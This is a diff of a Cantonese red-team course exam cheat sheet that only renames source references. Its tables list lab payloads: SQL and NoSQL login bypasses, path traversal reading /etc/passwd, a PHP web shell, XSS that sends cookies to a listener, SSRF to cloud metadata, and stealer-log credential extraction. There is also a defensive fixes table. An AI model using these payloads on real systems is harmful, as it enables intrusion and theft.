@@ -3,7 +3,7 @@
 > **來源**：本教程 11 份筆記（見 02_Study_Guides/），原教材 Advanced Red Team — Tutorial 3
 > **使用時機**：考試前 5–10 分鐘快速掃描；只保留「攻擊鏈地圖、逐節 payload、CWE／OWASP、Error/Fix、英文必背句、自測」。
 > **覆蓋範圍**：Stage 0 環境與工具／① 公開偵察／②A 認證與自動化濫用／②B 注入與 SSO／③ 權限提升／④ 憑證蒐集／⑤ 橫向檔案存取／⑥ 主機淪陷；共 15 節（§0–§14）。
-> 詳細解說請回查各階段 Study Guide（`ART_T3_00`、`ART_T3_P1`～`ART_T3_P6`）。
+> 詳細解說請回查各階段 Study Guide（`ART_T3_01` 及各攻擊階段 `ART_T3_02`～`ART_T3_08`）。
 > ⚠️ 本檔只覆蓋各筆記已有之內容與教材外補充；payload、URL、值一律照來源逐字，唔會臨場改寫。
 > ⚠️ 全部技術只准喺課程靶場／自己擁有嘅系統練習。未授權存取在香港屬刑事罪行。
 
@@ -13,7 +13,7 @@
 
 ## Part 1：攻擊鏈總覽速記
 
-**前置 Stage 0（`ART_T3_00`）**：啟動靶場（plain PHP ＋ 本地 SQLite）＋ Burp 代理設定 ＋ Repeater／Intruder 兩種工具用法。呢個階段唔係攻擊本身，係之後 15 節嘅操作地台。
+**前置 Stage 0（`ART_T3_01`）**：啟動靶場（plain PHP ＋ 本地 SQLite）＋ Burp 代理設定 ＋ Repeater／Intruder 兩種工具用法。呢個階段唔係攻擊本身，係之後 15 節嘅操作地台。
 
 > 一句原文總結：「public recon → initial access → privilege escalation → credential discovery → lateral file access → host compromise」
 
@@ -33,22 +33,22 @@
 | 原文 § | 原文標題 | 收錄於 |
 |---|---|---|
 | §0 | Lab Setup | `ART_T3_01_Setup_Tools_AttackChain_StudyGuide.md` |
-| §1 | CAPTCHA Bypass | `ART_T3_P2A_...` |
-| §2 | Email Bomb | `ART_T3_P2A_...` |
-| §3 | Admin Privilege Escalation (Hidden Endpoint) | `ART_T3_P3_...` |
-| §4 | SQL Injection in a JSON Object | `ART_T3_P2B_...` |
-| §5 | Web Cache Poisoning | `ART_T3_P5_...` |
-| §6 | Unlimited Brute Force | `ART_T3_P2A_...` |
-| §7 | Reflected XSS via HTTP Header | `ART_T3_P5_...` |
-| §8 | OSINT / Username Leakage | `ART_T3_P1_...` |
-| §9 | Backup File Brute Force | `ART_T3_P4_...` |
-| §10 | Local File Inclusion via Language Loader | `ART_T3_P5_...` |
-| §11 | Host Privilege Escalation via Internal Hints | `ART_T3_P6_...` |
-| §12 | NoSQL Injection via JSON Wildcard | `ART_T3_P2B_...` |
-| §13 | OAuth / SSO Misconfiguration | `ART_T3_P2B_...`（原文 mapping 漏收，教材外補充） |
-| §14 | Server-Side Request Forgery (SSRF) | `ART_T3_P5_...` |
+| §1 | CAPTCHA Bypass | `ART_T3_03_...` |
+| §2 | Email Bomb | `ART_T3_03_...` |
+| §3 | Admin Privilege Escalation (Hidden Endpoint) | `ART_T3_05_...` |
+| §4 | SQL Injection in a JSON Object | `ART_T3_04_...` |
+| §5 | Web Cache Poisoning | `ART_T3_07_...` |
+| §6 | Unlimited Brute Force | `ART_T3_03_...` |
+| §7 | Reflected XSS via HTTP Header | `ART_T3_07_...` |
+| §8 | OSINT / Username Leakage | `ART_T3_02_...` |
+| §9 | Backup File Brute Force | `ART_T3_06_...` |
+| §10 | Local File Inclusion via Language Loader | `ART_T3_07_...` |
+| §11 | Host Privilege Escalation via Internal Hints | `ART_T3_08_...` |
+| §12 | NoSQL Injection via JSON Wildcard | `ART_T3_04_...` |
+| §13 | OAuth / SSO Misconfiguration | `ART_T3_04_...`（原文 mapping 漏收，教材外補充） |
+| §14 | Server-Side Request Forgery (SSRF) | `ART_T3_07_...` |
 
-- 原文矛盾點一：**§8 同時屬階段①同④**（OSINT 搵用戶名既係偵察、亦係憑證蒐集）；本系列把 §8 主體放 P1，P4 只作交叉引用。
+- 原文矛盾點一：**§8 同時屬階段①同④**（OSINT 搵用戶名既係偵察、亦係憑證蒐集）；本系列把 §8 主體放 ART_T3_02，ART_T3_06 只作交叉引用。
 - 原文矛盾點二：原文六階段 mapping **完全冇收錄 §13 OAuth**；本系列按「帳號接管」性質歸入階段②B。
 
 ### 階段 × 成功訊號（靶場實證）
@@ -84,50 +84,50 @@
 
 | 情境 | payload／指令（原文逐字） | 來源 |
 |---|---|---|
-| CAPTCHA 洩漏答案 | `captcha=12&captcha_answer=12` | P2A §1 |
-| CAPTCHA 省略欄位 | 只 POST `username`、`full_name`、`email`、`password`（完全唔交 captcha） | P2A §1 |
-| CAPTCHA magic word | `captcha=bypass` | P2A §1 |
-| SQLi 登入繞過（tautology，JSON body） | `{"username":"admin' OR '1'='1","password":"x"}` | P2B §4 |
-| NoSQL operator 繞登入 | `{"username":"admin", "password":{"$ne":""}}` | P2B §12 |
-| OAuth 偷 code（改 redirect_uri） | `redirect_uri=http://localhost:8080/oauth.php?action=callback` → 改去 `http://localhost:9099/callback.php` | P2B §13 |
-| OAuth force-login | `http://localhost:8080/oauth.php?action=callback&code=<STOLEN_CODE>&state=<FRESH_STATE>` | P2B §13 |
+| CAPTCHA 洩漏答案 | `captcha=12&captcha_answer=12` | ART_T3_03 §1 |
+| CAPTCHA 省略欄位 | 只 POST `username`、`full_name`、`email`、`password`（完全唔交 captcha） | ART_T3_03 §1 |
+| CAPTCHA magic word | `captcha=bypass` | ART_T3_03 §1 |
+| SQLi 登入繞過（tautology，JSON body） | `{"username":"admin' OR '1'='1","password":"x"}` | ART_T3_04 §4 |
+| NoSQL operator 繞登入 | `{"username":"admin", "password":{"$ne":""}}` | ART_T3_04 §12 |
+| OAuth 偷 code（改 redirect_uri） | `redirect_uri=http://localhost:8080/oauth.php?action=callback` → 改去 `http://localhost:9099/callback.php` | ART_T3_04 §13 |
+| OAuth force-login | `http://localhost:8080/oauth.php?action=callback&code=<STOLEN_CODE>&state=<FRESH_STATE>` | ART_T3_04 §13 |
 
 ### B 組：注入
 
 | 情境 | payload／值（原文逐字） | 來源 |
 |---|---|---|
-| 布林真條件 | `{"username":"admin' AND '1'='1' OR '1'='1","password":"x"}`（回 200） | P2B §4 |
-| 布林假條件 | `{"username":"admin' AND '1'='2' OR '1'='1","password":"x"}`（回 401） | P2B §4 |
-| Blind 子查詢（問一字元） | `admin' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='1' OR '1'='1` | P2B §4 |
-| lab bad list（filter 內容） | `['UNION', 'INSERT', 'DELETE', 'UPDATE', 'DROP', '--', ';', '/*']`（`str_ireplace()` case-insensitive） | P2B §4 |
-| NoSQL wildcard | `{"role":"*"}` | P2B §12 |
-| NoSQL `$ne` | `{"role":{"$ne":"nonexistent"}}` | P2B §12 |
-| 真／假訊號（MySQL 走 JSON path） | 真 = HTTP 200 + `{"status":"ok"}`；假 = HTTP 401 + `{"status":"error","message":"Invalid credentials"}` | P2B §4 |
-| baseline vs 注入 | `{"role":"user"}` → 5 筆；`{"role":"*"}`／`{"$ne":"nonexistent"}` → 6 筆 | P2B §12 |
+| 布林真條件 | `{"username":"admin' AND '1'='1' OR '1'='1","password":"x"}`（回 200） | ART_T3_04 §4 |
+| 布林假條件 | `{"username":"admin' AND '1'='2' OR '1'='1","password":"x"}`（回 401） | ART_T3_04 §4 |
+| Blind 子查詢（問一字元） | `admin' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='1' OR '1'='1` | ART_T3_04 §4 |
+| lab bad list（filter 內容） | `['UNION', 'INSERT', 'DELETE', 'UPDATE', 'DROP', '--', ';', '/*']`（`str_ireplace()` case-insensitive） | ART_T3_04 §4 |
+| NoSQL wildcard | `{"role":"*"}` | ART_T3_04 §12 |
+| NoSQL `$ne` | `{"role":{"$ne":"nonexistent"}}` | ART_T3_04 §12 |
+| 真／假訊號（MySQL 走 JSON path） | 真 = HTTP 200 + `{"status":"ok"}`；假 = HTTP 401 + `{"status":"error","message":"Invalid credentials"}` | ART_T3_04 §4 |
+| baseline vs 注入 | `{"role":"user"}` → 5 筆；`{"role":"*"}`／`{"$ne":"nonexistent"}` → 6 筆 | ART_T3_04 §12 |
 
 ### C 組：檔案讀取與上傳
 
 | 情境 | payload／指令（原文逐字） | 來源 |
 |---|---|---|
-| 路徑穿越讀檔 | `http://localhost:8080/index.php?lang=../../../../../../etc/passwd` | P5 §10 |
-| 路徑穿越讀 backup | `http://localhost:8080/index.php?lang=../backup/config.php.bak` | P5 §10 |
-| 讀內部備忘錄 | `http://localhost:8080/index.php?lang=../../../../../../home/tyz/host_hints/IT_Notice.txt` | P6 §8.2 |
-| 讀密碼政策 | `http://localhost:8080/index.php?lang=../../../../../../opt/IT/password_policy.txt` | P6 §8.2 |
-| 上載請求（繞 default-deny） | `POST /admin/upload.php HTTP/1.1` + `Cookie: PHPSESSID=<...>` + `Content-Type: multipart/form-data; boundary=X` | P3 §8.2 |
-| 檔名 oracle（試 field 名） | `name="file"`（試：file, upload, uploadfile, file_upload, attachment, userfile, doc, document, image, photo） | P3 §8.2 |
-| Probe 檔案 | `/uploads/test.txt` | P3 §8.2 |
-| Web shell（一行 backdoor） | `<?php echo system($_GET['cmd']); ?>` | P3 §8.2 |
-| 執行命令（RCE） | `/uploads/shell.php?cmd=id`（成功如 `uid=1000(...)`） | P3 §8.2 |
-| .git 重構版本歷史 | `git clone http://localhost:8080/backup/.git /tmp/lab-src && cd /tmp/lab-src && git log --oneline` | P4 Q3 |
+| 路徑穿越讀檔 | `http://localhost:8080/index.php?lang=../../../../../../etc/passwd` | ART_T3_07 §10 |
+| 路徑穿越讀 backup | `http://localhost:8080/index.php?lang=../backup/config.php.bak` | ART_T3_07 §10 |
+| 讀內部備忘錄 | `http://localhost:8080/index.php?lang=../../../../../../home/tyz/host_hints/IT_Notice.txt` | ART_T3_08 §8.2 |
+| 讀密碼政策 | `http://localhost:8080/index.php?lang=../../../../../../opt/IT/password_policy.txt` | ART_T3_08 §8.2 |
+| 上載請求（繞 default-deny） | `POST /admin/upload.php HTTP/1.1` + `Cookie: PHPSESSID=<...>` + `Content-Type: multipart/form-data; boundary=X` | ART_T3_05 §8.2 |
+| 檔名 oracle（試 field 名） | `name="file"`（試：file, upload, uploadfile, file_upload, attachment, userfile, doc, document, image, photo） | ART_T3_05 §8.2 |
+| Probe 檔案 | `/uploads/test.txt` | ART_T3_05 §8.2 |
+| Web shell（一行 backdoor） | `<?php echo system($_GET['cmd']); ?>` | ART_T3_05 §8.2 |
+| 執行命令（RCE） | `/uploads/shell.php?cmd=id`（成功如 `uid=1000(...)`） | ART_T3_05 §8.2 |
+| .git 重構版本歷史 | `git clone http://localhost:8080/backup/.git /tmp/lab-src && cd /tmp/lab-src && git log --oneline` | ART_T3_06 Q3 |
 
 ### D 組：SSRF 與代理類
 
 | 情境 | payload／指令（原文逐字） | 來源 |
 |---|---|---|
-| 讀雲 metadata（假 AWS 憑證） | `http://localhost:8080/metadata.php?path=latest/meta-data/iam/security-credentials/LabInstanceRole` | P5 §14 |
-| 讀內部 secrets | `http://localhost:8080/internal/api.php?endpoint=secrets`（SMTP／API／VPN／DB secrets） | P5 §14 |
-| 讀內部 users | `http://localhost:8080/internal/api.php?endpoint=users`（service accounts） | P5 §14 |
-| image proxy 變讀檔器 | `curl "http://localhost:8080/imgproxy.php?url=file:///etc/passwd"` | P5 §14 |
+| 讀雲 metadata（假 AWS 憑證） | `http://localhost:8080/metadata.php?path=latest/meta-data/iam/security-credentials/LabInstanceRole` | ART_T3_07 §14 |
+| 讀內部 secrets | `http://localhost:8080/internal/api.php?endpoint=secrets`（SMTP／API／VPN／DB secrets） | ART_T3_07 §14 |
+| 讀內部 users | `http://localhost:8080/internal/api.php?endpoint=users`（service accounts） | ART_T3_07 §14 |
+| image proxy 變讀檔器 | `curl "http://localhost:8080/imgproxy.php?url=file:///etc/passwd"` | ART_T3_07 §14 |
 
 - §14 相關功能／參數名（原文）：`/services.php`（Page Preview）、`/pdf.php`（Report Export）、`/imgproxy.php`（image proxy）；參數名 `?url=`、`?page=`、`?preview=`、`?feed=`、`?target=`、`?callback=`。
 - metadata 位址：`169.254.169.254`（AWS）／`metadata.google.internal`（GCP）；loopback 服務 Redis `6379`、Elasticsearch `9200`。
@@ -136,15 +136,15 @@
 
 | 情境 | payload／值（原文逐字） | 來源 |
 |---|---|---|
-| §5 cache canary（確認 unkeyed） | `X-Forwarded-Host: hkiitcanary1234` | P5 §5 |
-| §5 毒 host | `X-Forwarded-Host: evil.example.com` | P5 §5 |
-| §7 反射確認 | `X-Username: CANARY_TEST_123` | P5 §7 |
-| §7 script 標籤 | `X-Username: <script>document.body.style.border='12px solid red'</script>` | P5 §7 |
-| §7 img onerror | `X-Username: <img src=x onerror="this.outerHTML='<mark>XSS via img onerror</mark>'">` | P5 §7 |
-| §7 svg onload | `X-Username: <svg onload="this.outerHTML='<mark>XSS via svg onload</mark>'"></svg>` | P5 §7 |
-| §7 偷 cookie | `X-Username: <img src=x onerror="this.outerHTML='<mark>Stolen cookie: '+document.cookie+'</mark>'">` | P5 §7 |
-| §7 外傳到 listener | `X-Username: <img src=x onerror="fetch('http://192.168.56.1:8088/?c='+encodeURIComponent(document.cookie))">` | P5 §7 |
-| §7 lab 內部 collector | `X-Username: <img src=x onerror="fetch('/oauth.php?action=leak&c='+encodeURIComponent(document.cookie)).then(()=>this.outerHTML='<mark>Cookie exfiltrated to attacker server</mark>')">` | P5 §7 |
+| §5 cache canary（確認 unkeyed） | `X-Forwarded-Host: hkiitcanary1234` | ART_T3_07 §5 |
+| §5 毒 host | `X-Forwarded-Host: evil.example.com` | ART_T3_07 §5 |
+| §7 反射確認 | `X-Username: CANARY_TEST_123` | ART_T3_07 §7 |
+| §7 script 標籤 | `X-Username: <script>document.body.style.border='12px solid red'</script>` | ART_T3_07 §7 |
+| §7 img onerror | `X-Username: <img src=x onerror="this.outerHTML='<mark>XSS via img onerror</mark>'">` | ART_T3_07 §7 |
+| §7 svg onload | `X-Username: <svg onload="this.outerHTML='<mark>XSS via svg onload</mark>'"></svg>` | ART_T3_07 §7 |
+| §7 偷 cookie | `X-Username: <img src=x onerror="this.outerHTML='<mark>Stolen cookie: '+document.cookie+'</mark>'">` | ART_T3_07 §7 |
+| §7 外傳到 listener | `X-Username: <img src=x onerror="fetch('http://192.168.56.1:8088/?c='+encodeURIComponent(document.cookie))">` | ART_T3_07 §7 |
+| §7 lab 內部 collector | `X-Username: <img src=x onerror="fetch('/oauth.php?action=leak&c='+encodeURIComponent(document.cookie)).then(()=>this.outerHTML='<mark>Cookie exfiltrated to attacker server</mark>')">` | ART_T3_07 §7 |
 
 - §5 cache key = `md5($_SERVER['REQUEST_URI'])`；header = `X-Forwarded-Host`；毒 host = `evil.example.com`。
 - §7 candidate headers：`User-Agent`、`Referer`、`X-Forwarded-For`、`Cookie`；custom wordlist：`X-Username`、`X-User`、`X-User-ID`、`X-Forwarded-User`；工具 Param Miner；listener port `8088`。
@@ -154,12 +154,12 @@
 
 | 情境 | payload／指令（原文逐字） | 來源 |
 |---|---|---|
-| 忽略大小寫搵目標網域行 | `grep -i hkgov data/stealer_sample.log` | P1 §8 |
-| 收窄並抽 username:password | `grep 'hkgov-service.local' data/stealer_sample.log \| awk -F: '{print $3 ":" $4}'` | P1 §8 |
-| 造 username wordlist | `cat > users.txt <<'EOF'` … `EOF` | P1 §8 |
-| 行憑證攻擊 | `python3 tools/brute.py http://localhost:8080` | P1 §8 |
-| 記錄攻擊面 | Burp **Proxy → HTTP history** | P1 §8 |
-| IDOR 探測 | `GET /message.php?id=2`（`id=1` 回 `New admin tools`） | P1 §8 |
+| 忽略大小寫搵目標網域行 | `grep -i hkgov data/stealer_sample.log` | ART_T3_02 §8 |
+| 收窄並抽 username:password | `grep 'hkgov-service.local' data/stealer_sample.log \| awk -F: '{print $3 ":" $4}'` | ART_T3_02 §8 |
+| 造 username wordlist | `cat > users.txt <<'EOF'` … `EOF` | ART_T3_02 §8 |
+| 行憑證攻擊 | `python3 tools/brute.py http://localhost:8080` | ART_T3_02 §8 |
+| 記錄攻擊面 | Burp **Proxy → HTTP history** | ART_T3_02 §8 |
+| IDOR 探測 | `GET /message.php?id=2`（`id=1` 回 `New admin tools`） | ART_T3_02 §8 |
 
 - 兩個未認證洩漏點：`/staff.php`（員工名錄）、`/api/users.php`（JSON API）；JSON 欄位 `username`、`full_name`、`email`、`role`。
 - 登入錯誤差異：存在 → `Password incorrect.`；唔存在 → `Username not found.`。
@@ -167,7 +167,7 @@
 - 移位陷阱：`443:mary.wong`（原行帶 URL scheme 令欄位後移一格）。
 - Infostealer 名：RedLine、Vidar、Raccoon；MITRE：T1593、T1594、T1589、T1590。
 
-**§9 備份副檔名／模式對照（P4 §8.2）**
+**§9 備份副檔名／模式對照（ART_T3_06 §8.2）**
 
 | 類別 | 模式 |
 |---|---|
@@ -187,13 +187,13 @@
 
 | 情境 | payload／指令（原文逐字） | 來源 |
 |---|---|---|
-| 目錄爆破 | `gobuster dir -u http://localhost:8080/admin -w /usr/share/wordlists/dirb/common.txt` | P3 §8.2 |
-| IDOR 探測 | `/message.php?id=1` → `id=2`、`id=3` | P3 §8.2 |
-| 拎 session 值 | Firefox DevTools → Storage → Cookies → `PHPSESSID` | P3 §8.2 |
-| 用戶名收割 | `/api/users.php` + `/staff.php` | P2A §6 |
-| Burp Intruder positions | `username=§admin§&password=§x§`（Cluster bomb） | P2A §6 |
-| 暴力破解（無 cookie） | `POST /login.php` 刪走 `Cookie:` header | P2A §6 |
-| 主機提權登入 | `ssh root@localhost`（重建密碼 `123qwe!@#`） | P6 §8.2 |
+| 目錄爆破 | `gobuster dir -u http://localhost:8080/admin -w /usr/share/wordlists/dirb/common.txt` | ART_T3_05 §8.2 |
+| IDOR 探測 | `/message.php?id=1` → `id=2`、`id=3` | ART_T3_05 §8.2 |
+| 拎 session 值 | Firefox DevTools → Storage → Cookies → `PHPSESSID` | ART_T3_05 §8.2 |
+| 用戶名收割 | `/api/users.php` + `/staff.php` | ART_T3_03 §6 |
+| Burp Intruder positions | `username=§admin§&password=§x§`（Cluster bomb） | ART_T3_03 §6 |
+| 暴力破解（無 cookie） | `POST /login.php` 刪走 `Cookie:` header | ART_T3_03 §6 |
+| 主機提權登入 | `ssh root@localhost`（重建密碼 `123qwe!@#`） | ART_T3_08 §8.2 |
 
 - 三個相扣弱點：**IDOR（horizontal）→ Broken function-level authorization → Unrestricted upload（vertical）**。
 - `/admin/upload.php` 係 `/admin/` 樹唯一漏檢查嘅 endpoint：條件寫成「`!is_admin()` **AND**（非 POST **OR** 冇 file）」。
@@ -225,18 +225,18 @@
 
 | 場景 | 設定／指令（原文逐字） | 來源 |
 |---|---|---|
-| PHP CAPTCHA session 比對 | `if (!isset($_SESSION['captcha_answer']) \|\| $_POST['captcha'] !== $_SESSION['captcha_answer']) { reject(); }` 之後 `unset($_SESSION['captcha_answer'])` | P2A §9.1 |
-| PHP 輸出編碼 | `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` | P5 §9.2 |
-| PHP 參數綁定 | PDO prepared statements + `bindParam`／`execute([...])`；`PDO::ATTR_EMULATE_PREPARES = false` | P2B §9.1 |
-| PHP 密碼雜湊 | `password_hash($pw, PASSWORD_BCRYPT)`／`password_verify()` | P2A §9.3 |
-| LFI allow-list | `$allowed = ['en' => 'lang/en', ...]; if (!isset($allowed[$lang])) $lang = 'en';` 再用 `realpath` 檢查 | P5 §9.3 |
-| SSRF cURL 限制 | `CURLOPT_PROTOCOLS`／`CURLOPT_REDIR_PROTOCOLS` 限 `https`、`CURLOPT_FOLLOWLOCATION=false` | P5 §9.4 |
-| Apache 封 dotfile | 用 `<FilesMatch>` 或 `<Directory>` 封 dotfile（回 403／404）；`Options -Indexes` | P4 §9.2 |
-| Nginx 封 dotfile | `location ~ /\.(?!well-known)` 回 404；`autoindex off;` | P4 §9.2 |
-| PHP-FPM 隔離 | 專屬低權限用戶 pool；`open_basedir` 限制可存取路徑 | P6 §9.2 |
-| ASP.NET 授權 | `[Authorize(Roles = "Admin")]`；`AddOpenIdConnect` 設 `CallbackPath`、`ResponseType = code`、開 PKCE | P3 §9／P2B §9.3 |
-| ASP.NET 帳號鎖定／限速 | `MaxFailedAccessAttempts` + `LockoutTimeSpan`；`AddRateLimiter` 綁 IP/user | P2A §9.3 |
-| SSH 加固 | `PermitRootLogin no`；`pam_google_authenticator` 做 MFA | P6 §9.1 |
+| PHP CAPTCHA session 比對 | `if (!isset($_SESSION['captcha_answer']) \|\| $_POST['captcha'] !== $_SESSION['captcha_answer']) { reject(); }` 之後 `unset($_SESSION['captcha_answer'])` | ART_T3_03 §9.1 |
+| PHP 輸出編碼 | `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` | ART_T3_07 §9.2 |
+| PHP 參數綁定 | PDO prepared statements + `bindParam`／`execute([...])`；`PDO::ATTR_EMULATE_PREPARES = false` | ART_T3_04 §9.1 |
+| PHP 密碼雜湊 | `password_hash($pw, PASSWORD_BCRYPT)`／`password_verify()` | ART_T3_03 §9.3 |
+| LFI allow-list | `$allowed = ['en' => 'lang/en', ...]; if (!isset($allowed[$lang])) $lang = 'en';` 再用 `realpath` 檢查 | ART_T3_07 §9.3 |
+| SSRF cURL 限制 | `CURLOPT_PROTOCOLS`／`CURLOPT_REDIR_PROTOCOLS` 限 `https`、`CURLOPT_FOLLOWLOCATION=false` | ART_T3_07 §9.4 |
+| Apache 封 dotfile | 用 `<FilesMatch>` 或 `<Directory>` 封 dotfile（回 403／404）；`Options -Indexes` | ART_T3_06 §9.2 |
+| Nginx 封 dotfile | `location ~ /\.(?!well-known)` 回 404；`autoindex off;` | ART_T3_06 §9.2 |
+| PHP-FPM 隔離 | 專屬低權限用戶 pool；`open_basedir` 限制可存取路徑 | ART_T3_08 §9.2 |
+| ASP.NET 授權 | `[Authorize(Roles = "Admin")]`；`AddOpenIdConnect` 設 `CallbackPath`、`ResponseType = code`、開 PKCE | ART_T3_05 §9／ART_T3_04 §9.3 |
+| ASP.NET 帳號鎖定／限速 | `MaxFailedAccessAttempts` + `LockoutTimeSpan`；`AddRateLimiter` 綁 IP/user | ART_T3_03 §9.3 |
+| SSH 加固 | `PermitRootLogin no`；`pam_google_authenticator` 做 MFA | ART_T3_08 §9.1 |
 
 ### J 組：高危 payload 反面教材（唔好誤用）
 
@@ -281,42 +281,42 @@
 | 憑證權威名稱 | `PortSwigger CA` | 00 §8.1 |
 | 攻擊鏈階段數／Section 總數 | 6 階段／15 節（§0–§14） | 00 §8.1 |
 | 原文 student questions 總數 | 53 條 | 00 §8.1 |
-| 靶場內部網域／URL | `hkgov-service.local`／`http://localhost:8080` | P1 §8 |
-| 未認證洩漏點 | `/staff.php`、`/api/users.php` | P1 §8 |
-| JSON 欄位 | `username`、`full_name`、`email`、`role` | P1 §8 |
-| 登入錯誤差異 | `Password incorrect.`／`Username not found.` | P1 §8 |
-| Stealer log 行格式 | `host:port:username:password` | P1 §8 |
-| 樣本憑證對 | `admin:123qwe!@#`、`john.doe:Welcome2024`、`bob.chan:changeme123`、`mary.wong:Passw0rd!` | P1 §8 |
-| IDOR 端點 | `GET /message.php?id=2`（`id=1` 回 `New admin tools`） | P1 §8 |
-| Infostealer 名 | RedLine、Vidar、Raccoon | P1 §8 |
-| MITRE（OSINT） | T1593、T1594、T1589、T1590 | P1 §8 |
-| §1 CAPTCHA 弱點編號 | CWE-602、CWE-603／A08:2021 | P2A §8.1 |
-| §1 三個 bypass | 洩漏答案、省略欄位、magic word `bypass` | P2A §8.1 |
-| §2 email bomb MITRE／倒數 | T1667／前端倒數 30 秒 | P2A §8.1 |
-| §6 鎖定門檻／attack type | 5 次失敗／Cluster bomb | P2A §8.1 |
-| 密碼字典來源 | `rockyou.txt`、SecLists、情境變形、`/opt/IT/password_policy.txt` | P2A §8.1 |
-| 建議雜湊 | bcrypt／Argon2（NIST SP 800-63B） | P2A §8.1 |
-| §4 OWASP 2021 數據 | 274,228 個受測應用、32,078 個 CVE、最高 incidence 19% | P2B §8.1 |
-| §4 In the wild | 2021 Accellion FTA | P2B §8.1 |
-| §4 還原密碼／flag | `123qwe!@#`／`FLAG{HIDDEN_ADMIN_ENDPOINT_ESCALATION_SUCCESS}` | P2B §8.1 |
-| §12 baseline vs 注入 | 5 筆 → 6 筆 | P2B §8.1 |
-| §13 lab provider／client | `http://localhost:8080/oauth_provider.php`；`client_id=gov_lab`、`response_type=code` | P2B §8.1 |
-| §13 callback | `http://localhost:8080/oauth.php?action=callback` → `http://localhost:9099/callback.php` | P2B §8.1 |
-| §13 安全標準 | RFC 9700（exact redirect-URI matching、PKCE 全 client） | P2B §8.1 |
-| §3 admin endpoint | `/admin/upload.php`（`/admin/` 樹唯一漏檢查） | P3 §8.1 |
-| §3 狀態碼語義 | 302 = 存在；404 = 唔存在；403 = 存在但你冇權 | P3 §8.1 |
-| §3 目錄爆破工具／路徑 | Gobuster/ffuf/Dirbuster/Burp Intruder；`/admin`、`/api`、`/uploads`、`/.git` | P3 §8.1 |
-| §9 CWE／OWASP | CWE-530／A05:2021 | P4 §8.1 |
-| §9 命中判別 | HTTP 200 = 存在可下載；404 = 唔存在 | P4 §8.1 |
-| §5 cache key／canary／毒 host | `md5($_SERVER['REQUEST_URI'])`／`hkiitcanary1234`／`evil.example.com` | P5 §8.1 |
-| §5 研究 | James Kettle 2018 "Practical Web Cache Poisoning"、2020 "Web Cache Entanglement" | P5 §8.1 |
-| §7 header／CWE／OWASP | `X-Username`→`$_SERVER['HTTP_X_USERNAME']`／CWE-79／A03:2021 | P5 §8.1 |
-| §10 參數／CWE／OWASP | `?lang=`／CWE-22／A01:2021 | P5 §8.1 |
-| §14 功能／CWE／OWASP | `/services.php`、`/pdf.php`、`/imgproxy.php`／CWE-918／A10:2021 | P5 §8.1 |
-| §14 metadata | `169.254.169.254`（AWS）、`metadata.google.internal`（GCP） | P5 §8.1 |
-| §11 密碼長度／重建值 | 9 字元（3 數字＋3 字母＋3 Shift 符號）／`123qwe!@#` | P6 §8.1 |
-| §11 特權判別 | `/etc/passwd` UID 0，例 `root:x:0:0:root:/root:/bin/bash` | P6 §8.1 |
-| §11 MITRE／OWASP | TA0004／A07:2021 | P6 §8.1 |
+| 靶場內部網域／URL | `hkgov-service.local`／`http://localhost:8080` | ART_T3_02 §8 |
+| 未認證洩漏點 | `/staff.php`、`/api/users.php` | ART_T3_02 §8 |
+| JSON 欄位 | `username`、`full_name`、`email`、`role` | ART_T3_02 §8 |
+| 登入錯誤差異 | `Password incorrect.`／`Username not found.` | ART_T3_02 §8 |
+| Stealer log 行格式 | `host:port:username:password` | ART_T3_02 §8 |
+| 樣本憑證對 | `admin:123qwe!@#`、`john.doe:Welcome2024`、`bob.chan:changeme123`、`mary.wong:Passw0rd!` | ART_T3_02 §8 |
+| IDOR 端點 | `GET /message.php?id=2`（`id=1` 回 `New admin tools`） | ART_T3_02 §8 |
+| Infostealer 名 | RedLine、Vidar、Raccoon | ART_T3_02 §8 |
+| MITRE（OSINT） | T1593、T1594、T1589、T1590 | ART_T3_02 §8 |
+| §1 CAPTCHA 弱點編號 | CWE-602、CWE-603／A08:2021 | ART_T3_03 §8.1 |
+| §1 三個 bypass | 洩漏答案、省略欄位、magic word `bypass` | ART_T3_03 §8.1 |
+| §2 email bomb MITRE／倒數 | T1667／前端倒數 30 秒 | ART_T3_03 §8.1 |
+| §6 鎖定門檻／attack type | 5 次失敗／Cluster bomb | ART_T3_03 §8.1 |
+| 密碼字典來源 | `rockyou.txt`、SecLists、情境變形、`/opt/IT/password_policy.txt` | ART_T3_03 §8.1 |
+| 建議雜湊 | bcrypt／Argon2（NIST SP 800-63B） | ART_T3_03 §8.1 |
+| §4 OWASP 2021 數據 | 274,228 個受測應用、32,078 個 CVE、最高 incidence 19% | ART_T3_04 §8.1 |
+| §4 In the wild | 2021 Accellion FTA | ART_T3_04 §8.1 |
+| §4 還原密碼／flag | `123qwe!@#`／`FLAG{HIDDEN_ADMIN_ENDPOINT_ESCALATION_SUCCESS}` | ART_T3_04 §8.1 |
+| §12 baseline vs 注入 | 5 筆 → 6 筆 | ART_T3_04 §8.1 |
+| §13 lab provider／client | `http://localhost:8080/oauth_provider.php`；`client_id=gov_lab`、`response_type=code` | ART_T3_04 §8.1 |
+| §13 callback | `http://localhost:8080/oauth.php?action=callback` → `http://localhost:9099/callback.php` | ART_T3_04 §8.1 |
+| §13 安全標準 | RFC 9700（exact redirect-URI matching、PKCE 全 client） | ART_T3_04 §8.1 |
+| §3 admin endpoint | `/admin/upload.php`（`/admin/` 樹唯一漏檢查） | ART_T3_05 §8.1 |
+| §3 狀態碼語義 | 302 = 存在；404 = 唔存在；403 = 存在但你冇權 | ART_T3_05 §8.1 |
+| §3 目錄爆破工具／路徑 | Gobuster/ffuf/Dirbuster/Burp Intruder；`/admin`、`/api`、`/uploads`、`/.git` | ART_T3_05 §8.1 |
+| §9 CWE／OWASP | CWE-530／A05:2021 | ART_T3_06 §8.1 |
+| §9 命中判別 | HTTP 200 = 存在可下載；404 = 唔存在 | ART_T3_06 §8.1 |
+| §5 cache key／canary／毒 host | `md5($_SERVER['REQUEST_URI'])`／`hkiitcanary1234`／`evil.example.com` | ART_T3_07 §8.1 |
+| §5 研究 | James Kettle 2018 "Practical Web Cache Poisoning"、2020 "Web Cache Entanglement" | ART_T3_07 §8.1 |
+| §7 header／CWE／OWASP | `X-Username`→`$_SERVER['HTTP_X_USERNAME']`／CWE-79／A03:2021 | ART_T3_07 §8.1 |
+| §10 參數／CWE／OWASP | `?lang=`／CWE-22／A01:2021 | ART_T3_07 §8.1 |
